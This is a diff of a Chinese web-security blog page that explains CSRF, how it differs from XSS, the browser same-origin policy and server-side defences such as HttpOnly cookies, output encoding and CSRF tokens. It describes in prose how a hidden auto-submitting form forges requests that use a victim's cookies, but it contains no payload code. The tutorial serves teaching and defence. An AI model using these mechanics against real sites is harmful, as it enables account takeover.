+<li>受害者先登录存在漏洞的网站，并且保存session cookie的内容在本地，如此便无需重复登录； <!-- raw HTML omitted --></li>
+<li>黑客向受害者发送一个恶意网站的链接（链接中只可以包含网址），诱导受害者点击后请求该网页的资源； <!-- raw HTML omitted --></li>
+<li>这个网页中带有 <strong>隐藏表格</strong> 来自动发起POST请求，向存在漏洞的目标网站发送恶意操作的请求（例如修改账号密码）； <!-- raw HTML omitted --></li>
 </ol>
-<p><figure><img src="/ox-hugo/2022-05-19_21-50-14_screenshot.png" width="700px"/>
+<p>此举能够成功是因：浏览器在发送请求的时候，会自动带上该域名下的所有本地存储的cookie，也就是可以伪装称是本人发出的修改请求，而用户本人可以对次完全不知情； <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-19_21-50-14_screenshot.png"
+         alt="Figure 7: CSRF的步骤" width="700px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 7: <!-- raw HTML omitted -->CSRF的步骤</p>
+        </figcaption>
 </figure>
  <!-- raw HTML omitted --></p>
-<p>我们这里可以总结一下CSRF与XSS的区别，我们假设存在漏洞的网站为 <a class="link" href="https://www.vulnerable.com"  target="_blank" rel="noopener"
-    >www.vulnerable.com</a>，黑客构造的网页叫做  <a class="link" href="https://www.malicious.com"  target="_blank" rel="noopener"
-    >www.malicious.com</a> <!-- raw HTML omitted --></p>
+<p>我们这里可以总结一下CSRF与XSS的区别，我们假设： <!-- raw HTML omitted --></p>
 <ul>
 <li>
-<p>在XSS中要完成的目标是，诱导用户点击 <a class="link" href="https://www.vulnerable.com"  target="_blank" rel="noopener"
-    >www.vulnerable.com</a> 的链接（DOM，Reflected需要修改url，Stored则不需要），然后使浏览器在当前页面下执行恶意代码，例如直接盗取cookie <!-- raw HTML omitted --></p>
+<p>存在漏洞的目标网站为 <strong><a class="link" href="https://www.vulnerable.com"  target="_blank" rel="noopener"
+    >www.vulnerable.com</a></strong>; <!-- raw HTML omitted --></p>
 </li>
 <li>
-<p>在CSRF中要完成的目标是，诱导用户点击 <a class="link" href="https://www.malicious.com"  target="_blank" rel="noopener"
-    >www.malicious.com</a> 的链接，www.malicious.com的网页内容中会自动地向 <a class="link" href="https://www.vulnerable.com"  target="_blank" rel="noopener"
-    >www.vulnerable.com</a> <!-- raw HTML omitted -->
-发起HTTP请求，同时浏览器会附带上所有域名www.vulnerable.com下的cookie，从而伪装成用户对服务器端造成影响 <!-- raw HTML omitted --></p>
+<p>黑客构造的网页叫做 <strong><a class="link" href="https://www.malicious.com"  target="_blank" rel="noopener"
+    >www.malicious.com</a></strong>; <!-- raw HTML omitted --></p>
+</li>
+<li>
+<p>在XSS中要完成的目标是： <!-- raw HTML omitted --></p>
+<ul>
+<li>诱导用户点击 <strong><a class="link" href="https://www.vulnerable.com"  target="_blank" rel="noopener"
+    >www.vulnerable.com</a></strong> 的链接（DOM，Reflected需要修改url，Stored则不需要）; <!-- raw HTML omitted --></li>
+<li>然后使本地浏览器在当前页面下执行恶意代码，例如直接盗取cookie; <!-- raw HTML omitted --></li>
+</ul>
+</li>
+<li>
+<p>在CSRF中要完成的目标是: <!-- raw HTML omitted --></p>
+<ul>
+<li>诱导用户点击 <strong><a class="link" href="https://www.malicious.com"  target="_blank" rel="noopener"
+    >www.malicious.com</a></strong> 的链接; <!-- raw HTML omitted --></li>
+<li><strong><a class="link" href="https://www.malicious.com"  target="_blank" rel="noopener"
+    >www.malicious.com</a></strong> 在网页中会自动发起对 <strong><a class="link" href="https://www.vulnerable.com"  target="_blank" rel="noopener"
+    >www.vulnerable.com</a></strong> 的请求； <!-- raw HTML omitted --></li>
+<li>浏览器此时就会为这个请求附带上所有域名在 <strong><a class="link" href="https://www.vulnerable.com"  target="_blank" rel="noopener"
+    >www.vulnerable.com</a></strong> 下的cookie，从而伪装成用户对服务器端造成影响； <!-- raw HTML omitted --></li>
+</ul>
 </li>
 </ul>
 <h2 id="same-origin-policy-浏览器的同源策略">Same-origin policy 浏览器的同源策略</h2>
-<p>看到了上面的例子之后，我想提出一个问题？为什么我们不能直接从第三方网站获取目标网站下的cookie呢？ <!-- raw HTML omitted --></p>
-<p>这里就涉及到了浏览器的同源策略 <!-- raw HTML omitted --></p>
-<p>同源策略的是各个浏览器用于限制不同源的网页直接进行资源交换的行为的一种安全策略 <!-- raw HTML omitted --></p>
-<p>我们这里需要强调同源策略是由浏览器制定的，用于保护存放在浏览器上的内容，比如相当重要的session cookie，我们知道可以利用 <code>document.cookie</code> 来获取当前页面的cookie，如果没有同源策略，那么黑客就可以通过注入JS脚本来获取用户存放与客户端的所有内容，也可以继续调用DOM的API进行DOM内容的修改以及访问，这是非常危险的。 <!-- raw HTML omitted --></p>
-<h3 id="definition-of-an-origin-同源的概念">Definition of an origin 同源的概念</h3>
-<p>两个URLs如果被称为同源，他们必须要保证协议(http/https),端口（如果被指定了的话）一致，访问资源的路径不一样没有关系 <!-- raw HTML omitted --></p>
-<p>我们通过一个例子来解释 <!-- raw HTML omitted --></p>
+<p>看到了上面的例子之后，我想提出一个问题： <!-- raw HTML omitted --></p>
+<blockquote>
+<p>为什么我们不能直接从第三方网站获取用户在目标网站下的cookie呢？ <!-- raw HTML omitted --></p>
+</blockquote>
+<p>而还需要通过用户来发起这个请求； <!-- raw HTML omitted --></p>
+<p>这里就涉及到了浏览器的同源策略机制： <!-- raw HTML omitted --></p>
+<p>同源策略是各个浏览器用于限制 <strong>不同源</strong> 的网页直接进行 <strong>资源交换</strong> 行为的一种安全策略。 <!-- raw HTML omitted --></p>
+<p>我们这里需要强调：同源策略是由浏览器制定的，用于保护存放在浏览器上的内容，比如相当重要的session cookie，我们知道可以利用 <code>document.cookie</code> 来获取当前页面的cookie，如果没有同源策略，那么黑客就可以通过注入JS脚本来获取用户存放与客户端的所有内容，也可以继续调用DOM的API进行DOM内容的修改以及访问，这是非常危险的。 <!-- raw HTML omitted --></p>
+<p>那么同源策略到底是如何做到的，我们就先从了解 <code>同源</code> 这个概念讲起： <!-- raw HTML omitted --></p>
+<h3 id="同源-的概念">“同源”的概念</h3>
+<p>两个URLs如果被称为同源，他们必须要保证以下内容保持一致： <!-- raw HTML omitted --></p>
+<ul>
+<li>协议(http/https); <!-- raw HTML omitted --></li>
+<li>host； <!-- raw HTML omitted --></li>
+<li>端口（如果被指定了的话）； <!-- raw HTML omitted --></li>
+</ul>
+<p>因此这个方案也被称为“协议/主机/端口元祖” <!-- raw HTML omitted --></p>
+<p>而访问资源的路径不一样没有关系； <!-- raw HTML omitted --></p>
+<p>我们通过一个例子来解释： <!-- raw HTML omitted --></p>
 <p>针对URL： <code>http://store.company.com/dir/page.html</code> <!-- raw HTML omitted --></p>
 <div class="table-wrapper"><table>
 <thead>
@@ -528,13 +609,25 @@ if (!doNotTrack) {
 </tbody>
 </table></div>
 <h3 id="跨站网络访问">跨站网络访问</h3>
-<p>不同源的网页之间进行交互的方式一般由三种： <!-- raw HTML omitted --></p>
+<p>不同源的网页之间进行交互的方式一般由三种操作： <!-- raw HTML omitted --></p>
 <ol>
-<li>Cross-origin writes 跨站写操作：一般来说是被允许的。比如页面中的链接（links），重定向以及表单提交 <!-- raw HTML omitted --></li>
-<li>Cross-origin embedding 跨站资源嵌入：一般来说也是被允许的 <!-- raw HTML omitted --></li>
-<li>Cross-origin reads 跨站读操作：一般来说是不被允许的，即从一个网页向另一个网页直接获取数据 <!-- raw HTML omitted --></li>
+<li>Cross-origin <strong>writes</strong> 跨站写操作： <!-- raw HTML omitted -->
+<ul>
+<li>一般来说是被允许的，比如页面中的链接（links），重定向以及表单提交； <!-- raw HTML omitted --></li>
+</ul>
+</li>
+<li>Cross-origin <strong>embedding</strong> 跨站资源嵌入： <!-- raw HTML omitted -->
+<ul>
+<li>一般来说也是被允许的; <!-- raw HTML omitted --></li>
+</ul>
+</li>
+<li>Cross-origin <strong>reads</strong> 跨站读操作： <!-- raw HTML omitted -->
+<ul>
+<li>一般来说是不被允许的，即从一个网页向另一个网页直接获取数据，资源； <!-- raw HTML omitted --></li>
+</ul>
+</li>
 </ol>
-<p>跨站资源嵌入的一些例子： <!-- raw HTML omitted --></p>
+<p>这里跨站资源嵌入的一些例子： <!-- raw HTML omitted --></p>
 <ul>
 <li>&lt;script src=&rdquo;&hellip;&quot;&gt;&lt;/script&gt; 标签嵌入跨站脚本。语法错误信息只能被同源脚本中捕捉到。 <!-- raw HTML omitted --></li>
 <li>&lt;link rel=&ldquo;stylesheet&rdquo; href=&quot;&hellip;&quot;&gt; 标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨站需要一个设置正确的 HTTP 头部 Content-Type 。不同浏览器有不同的限制： IE, Firefox, Chrome, Safari (跳至CVE-2010-0051)部分 和 Opera。 <!-- raw HTML omitted --></li>
@@ -545,64 +638,81 @@ if (!doNotTrack) {
 <li>通过 &lt;iframe&gt; 载入的任何资源。站点可以使用 X-Frame-Options 消息头来阻止这种形式的跨站交互。 <!-- raw HTML omitted --></li>
 </ul>
 <h3 id="如何允许跨站访问">如何允许跨站访问</h3>
-<p>可以通过由服务端发回的HTTP响应中，添加 <code>CORS</code> field来指定那些host可以加载资源 <!-- raw HTML omitted --></p>
+<p>可以通过由服务端发回的HTTP响应中添加 <a class="link" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS"  target="_blank" rel="noopener"
+    >CORS</a> header来标明哪些Origin域可以加载其资源； <!-- raw HTML omitted --></p>
 <h3 id="如何阻止跨站访问">如何阻止跨站访问</h3>
 <ul>
-<li>阻止跨站写操作，只要检测请求中的一个不可推测的标记(CSRF token)即可，这个标记被称为 Cross-Site Request Forgery (CSRF) 标记。你必须使用这个标记来阻止页面的跨站读操作。 <!-- raw HTML omitted --></li>
+<li>阻止跨站 <strong>写操作</strong>, 只要检测请求中的一个不可推测的标记(CSRF token)即可，这个标记被称为 Cross-Site Request Forgery (CSRF) 标记。你必须使用这个标记来阻止页面的跨站读操作。 <!-- raw HTML omitted --></li>
 <li>阻止资源的跨站读取，需要保证该资源是不可嵌入的。阻止嵌入行为是必须的，因为嵌入资源通常向其暴露信息。 <!-- raw HTML omitted --></li>
 <li>阻止跨站嵌入，需要确保你的资源不能通过以上列出的可嵌入资源格式使用。浏览器可能不会遵守 Content-Type 头部定义的类型。例如，如果您在HTML文档中指定 &lt;script&gt; 标记，则浏览器将尝试将标签内部的 HTML 解析为JavaScript。 当您的资源不是您网站的入口点时，您还可以使用CSRF令牌来防止嵌入。 <!-- raw HTML omitted --></li>
 </ul>
 <h3 id="跨站数据存储访问">跨站数据存储访问</h3>
-<p>Cookies  使用不同的源定义方式。一个页面可以为本域和其父域设置 cookie，只要是父域不是公共后缀（public suffix）即可。Firefox 和 Chrome 使用 Public Suffix List 检测一个域是否是公共后缀（public suffix）。 <!-- raw HTML omitted --></p>
-<h2 id="countermeasure-如何防范针对web客户端的攻击">Countermeasure 如何防范针对WEB客户端的攻击</h2>
-<p>我们可以将主要的对策分为两种 <!-- raw HTML omitted --></p>
-<dl>
-<dt>客户端</dt>
-<dd>客户端的防御依赖于用户的安全意识以及一些浏览器还有插件的辅助 <!-- raw HTML omitted -->
+<p>Cookies 使用不同的源定义方式： <!-- raw HTML omitted --></p>
 <ul>
-<li>尽量访问原始网站，不要访问那些后面带着很多GET参数的链接 <!-- raw HTML omitted --></li>
-<li>默认关闭JS来避免恶意代码的执行 <!-- raw HTML omitted --></li>
-<li>在访问比较敏感的网页的时候尽量不要访问其他的网站 <!-- raw HTML omitted --></li>
-<li>及时关闭重启浏览器 <!-- raw HTML omitted --></li>
+<li>一个页面可以为 <strong>本域</strong> 和其 <strong>父域</strong> 设置 cookie，只要是父域不是公共后缀（public suffix）即可。 <!-- raw HTML omitted --></li>
+<li>Firefox 和 Chrome 使用 Public Suffix List 检测一个域是否是公共后缀（public suffix）。 <!-- raw HTML omitted --></li>
+</ul>
+<h2 id="countermeasure-如何防范针对web客户端的攻击">Countermeasure 如何防范针对WEB客户端的攻击</h2>
+<p>我们可以将主要的对策分为两种： <!-- raw HTML omitted --></p>
+<dl>
+<dt>客户端上的防御</dt>
+<dd>客户端的防御依赖于用户的 <strong>安全意识</strong> 以及一些浏览器还有插件的辅助: <!-- raw HTML omitted -->
+<ul>
+<li>尽量访问原始网站，不要访问那些后面带着很多GET参数的链接； <!-- raw HTML omitted --></li>
+<li>默认关闭JS（利用插件）来避免恶意代码的执行； <!-- raw HTML omitted --></li>
+<li>在访问比较敏感的网页的时候尽量不要访问其他的网站（防止这些敏感的网页所使用的cookie被利用）； <!-- raw HTML omitted --></li>
+<li>及时关闭重启浏览器（结束session）； <!-- raw HTML omitted --></li>
 </ul>
 </dd>
 <dt>服务端</dt>
-<dd>XSS <!-- raw HTML omitted -->
+<dd><ul>
+<li>
+<p>XSS <!-- raw HTML omitted --></p>
 <ol>
-<li>
-<p>HttpOnly cookie: <!-- raw HTML omitted --></p>
-<p>服务端给一些重要的cookie设置 <code>HttpOnly</code> 属性，从而避免这些cookie被脚本语言所调用查看以及利用 <!-- raw HTML omitted --></p>
+<li>HttpOnly cookie: <!-- raw HTML omitted -->
+<ul>
+<li>服务端给一些重要的cookie设置 <code>HttpOnly</code> 属性，从而避免这些cookie被脚本语言所调用查看以及利用 <!-- raw HTML omitted --></li>
+<li><strong>HttpOnly</strong> 我们在前面介绍过，即设置了这个属性的Cookie无法被JS访问，也就不会泄露了； <!-- raw HTML omitted --></li>
+</ul>
 </li>
-<li>
-<p>Input validation 输入检查： <!-- raw HTML omitted --></p>
-<p>对于所有的用户输入我们都需要进行严格的检查以及过滤，组织一些恶意脚本的插入（e.g. htmlspecialchars() in php） <!-- raw HTML omitted --></p>
+<li>Input validation 输入检查： <!-- raw HTML omitted -->
+<ul>
+<li>对于所有的用户输入我们都需要进行严格的检查以及过滤，阻止一些恶意脚本的插入（e.g. htmlspecialchars() in php）； <!-- raw HTML omitted --></li>
+</ul>
 </li>
-<li>
-<p>Output validation &amp; HTML encode 输出检查与HTML编码： <!-- raw HTML omitted --></p>
-<p>我们除了对用户发送过来的HTTP请求进行检查，还需要在返回HTML代码之前进行二次检查，因为可能在服务器端的脚本执行之后，一些恶意的代码被嵌入到了HTML代码中，因此我们可以通过例如 <code>HTML encode</code> 的方法将特殊字符全部转换为 <code>HTML entities</code> 来避免这样的情况发生 <!-- raw HTML omitted --></p>
+<li>Output validation &amp; HTML encode 输出检查与HTML编码： <!-- raw HTML omitted -->
+<ul>
+<li>我们除了对用户发送过来的HTTP请求进行检查，还需要在返回HTML代码之前进行二次检查，因为可能在服务器端的脚本执行之后，一些恶意的代码被嵌入到了HTML代码中； <!-- raw HTML omitted --></li>
+<li>因此我们可以通过例如 <code>HTML encode</code> 的方法将特殊字符全部转换为 <code>HTML entities</code> 来避免这样的情况发生； <!-- raw HTML omitted --></li>
+</ul>
 </li>
 </ol>
+</li>
+<li>
 <p>CSRF <!-- raw HTML omitted --></p>
 <ol>
-<li>
-<p>Two-factor authentication (e.g.,验证码) <!-- raw HTML omitted --></p>
-<p>因为在CSRF中，往往在用户毫不知情的情况下就发生了针对用户账号的攻击，那么我们可以设置双重认证来保护那些重要的操作必须在用户的许可下才能执行 <!-- raw HTML omitted --></p>
+<li>Two-factor authentication (e.g.,验证码): <!-- raw HTML omitted -->
+<ul>
+<li>因为在CSRF中，往往在用户毫不知情的情况下就发生了针对用户账号的攻击，那么我们可以设置双重认证来保护那些重要的操作必须在用户的许可下才能执行； <!-- raw HTML omitted --></li>
+</ul>
 </li>
-<li>
-<p>CSRF tokens <!-- raw HTML omitted --></p>
-</li>
-<li>
-<p>Referer检查 <!-- raw HTML omitted --></p>
-<p>检查请求是否是通过合理的域名下跳转而来的，比如提交表单是由发帖页面跳转而来。 <!-- raw HTML omitted --></p>
+<li>CSRF tokens（最后会介绍） <!-- raw HTML omitted --></li>
+<li>Referer检查 <!-- raw HTML omitted -->
+<ul>
+<li>检查请求是否是通过合理的域名下跳转而来的，比如提交表单是由发帖页面跳转而来。 <!-- raw HTML omitted --></li>
+</ul>
 </li>
 </ol>
+</li>
+</ul>
 </dd>
 </dl>
 <h3 id="csrf-tokens">CSRF tokens</h3>
-<p>CSRF tokens是由服务端产生的，在用户登录之后在HTTP Response中发送给客户端，客户端将这个token存储在本地，例如添加一个隐藏的字段中 <!-- raw HTML omitted --></p>
-<p>当用户再次向服务器端发送请求的时候，服务器端就会检查token是否在HTTP header当中，从而预防CSRF <!-- raw HTML omitted --></p>
-<p>因为通过黑客的网站发出的请求，只能最多包含cookie的内容，却不能包含存在于原始页面中的隐藏token，导致访问失败 <!-- raw HTML omitted --></p>
+<p><strong>CSRF tokens</strong> 是由服务端产生的，在用户登录之后在HTTP Response中发送给客户端，客户端将这个token存储在本地，例如添加一个隐藏的字段中； <!-- raw HTML omitted --></p>
+<p>当用户再次向服务器端发送请求的时候，服务器端就会检查token是否被包含在HTTP header当中，从而预防CSRF； <!-- raw HTML omitted --></p>
+<p>因为通过黑客的网站发出的请求，只能最多包含cookie的内容，却不能包含存在于原始页面中的隐藏token，导致访问失败； <!-- raw HTML omitted --></p>
 <h2 id="reference">Reference</h2>
+<blockquote>
 <p><a class="link" href="https://www.sqlsec.com/2020/01/xss.html#toc-heading-1"  target="_blank" rel="noopener"
     >XSS 从零开始</a> <!-- raw HTML omitted --></p>
 <p><a class="link" href="https://www.freebuf.com/articles/web/261158.html"  target="_blank" rel="noopener"
@@ -610,6 +720,7 @@ if (!doNotTrack) {
 <p><a class="link" href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy#%E8%B7%A8%E6%BA%90%E7%BD%91%E7%BB%9C%E8%AE%BF%E9%97%AE"  target="_blank" rel="noopener"
     >Same-origin policy</a> <!-- raw HTML omitted --></p>
 <p>《白帽子讲web安全》 <!-- raw HTML omitted --></p>
+</blockquote>
 
 </section>
 
@@ -618,9 +729,9 @@ if (!doNotTrack) {
     
     <section class="article-tags">
         
-            <a href="/tags/ctf/">ctf</a>
-        
             <a href="/tags/xss/">xss</a>
+        
+            <a href="/tags/csrf/">csrf</a>
         
     </section>
 
@@ -647,7 +758,7 @@ if (!doNotTrack) {
 
 
         <span>
-            Last updated on Nov 01, 2022 22:30 CST
+            Last updated on Nov 03, 2022 11:13 CST
         </span>
     </section></footer>
 
@@ -681,39 +792,6 @@ if (!doNotTrack) {
     
 
     
-
-<aside class="related-contents--wrapper">
-    <h2 class="section-title">Related contents</h2>
-    <div class="related-contents">
-        <div class="flex article-list--tile">
-            
-                
-<article class="">
-    <a href="/posts/xss_challenge_trip/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">XSS 挑战之旅</h2>
-        </div>
-    </a>
-</article>
-            
-                
-<article class="">
-    <a href="/posts/sqli_blind_injection/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">SQL注入：盲注</h2>
-        </div>
-    </a>
-</article>
-            
-        </div>
-    </div>
-</aside>
 
      
     
@@ -886,8 +964,10 @@ if (!doNotTrack) {
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ul>
+    <li><a href="#写在前面">写在前面</a></li>
     <li><a href="#prerequisite-前提知识">Prerequisite 前提知识</a>
       <ul>
+        <li><a href="#session">Session</a></li>
         <li><a href="#cookie">Cookie</a></li>
       </ul>
     </li>
@@ -897,13 +977,13 @@ if (!doNotTrack) {
         <li><a href="#reflected-xss-反射型xss">Reflected XSS 反射型XSS</a></li>
         <li><a href="#stored-xss-存储型-xss">Stored XSS 存储型 XSS</a></li>
         <li><a href="#dom-based-xss">DOM-based XSS</a></li>
-        <li><a href="#xss的危害">XSS的危害</a></li>
+        <li><a href="#xss的工具">XSS的工具</a></li>
       </ul>
     </li>
     <li><a href="#csrf">CSRF</a></li>
     <li><a href="#same-origin-policy-浏览器的同源策略">Same-origin policy 浏览器的同源策略</a>
       <ul>
-        <li><a href="#definition-of-an-origin-同源的概念">Definition of an origin 同源的概念</a></li>
+        <li><a href="#同源-的概念">“同源”的概念</a></li>
         <li><a href="#跨站网络访问">跨站网络访问</a></li>
         <li><a href="#如何允许跨站访问">如何允许跨站访问</a></li>
         <li><a href="#如何阻止跨站访问">如何阻止跨站访问</a></li>
